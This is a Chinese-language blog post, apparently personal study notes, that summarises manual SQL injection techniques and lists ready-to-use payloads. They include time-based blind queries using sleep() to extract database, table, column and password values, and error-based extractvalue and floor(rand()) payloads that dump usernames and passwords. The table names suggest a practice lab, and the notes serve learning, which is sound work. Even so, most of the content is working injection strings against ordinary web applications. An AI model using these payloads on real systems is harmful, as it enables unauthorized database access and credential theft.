---
title: "[漏洞总结]0x1手工SQL总结"
desc: TonyD0g
date: 2022-01-05 15:55:26
tags: 漏洞总结
---
<font size=4 >

###### [版本0x1] 
###### 2022-01-05
## SQL注入常用方法:
#### (通常相互搭配)

- 1.时间型注入
- 2.布尔型注入
- 3.报错型注入
- 4.UA注入
- 5.referer注入
- 6.Get/Post型注入
- 7.cookie型注入
- 8.编码注入

1.时间型注入:
```
库:
id=admin' and if(length(database())=8,sleep(5),1)--+
id=admin' and if(left(database(),1)='s',sleep(5),1)--+
表: 
id=admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+
列:
id=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+
值: 
id=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
id=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```
2.布尔型注入:
```
根据 相关表达式是否相等 来判断注入是否成功.
代码与 "1.时间型注入" 相同.
```
3.报错型注入:
```
根据 页面上显示的字符 来判断注入是否成功,比如注入成功后显示"success",注入失败后显示"fail".
```
4/5/6/7/8 UA注入 , referer注入 , Get/Post注入 , cookie注入
```
在UA头里注入 , 在referer里注入 , Get/Post方式注入 , 在cookie里注入
```
8.编码注入
```
注入的数据必须经过编码,否则注入无效.
```
## 常用SQL注入命令:
extractvalue函数,updatexml函数
```
爆库:
id=admin' and extractvalue(1,concat(0x7e,(select database()))) --+
爆表:
id=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
查询除emails以外的其他表:
id=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in ('emails')))) --+
爆列名:
id=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+
爆值:
id=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+
同样利用not in,可以查询其他值:
id=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+
```
concat函数
```
id=admin' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a --+
```

## 学习来源:
```
SQL注入Wiki:
http://sqlwiki.radare.cn/#/
```
</font>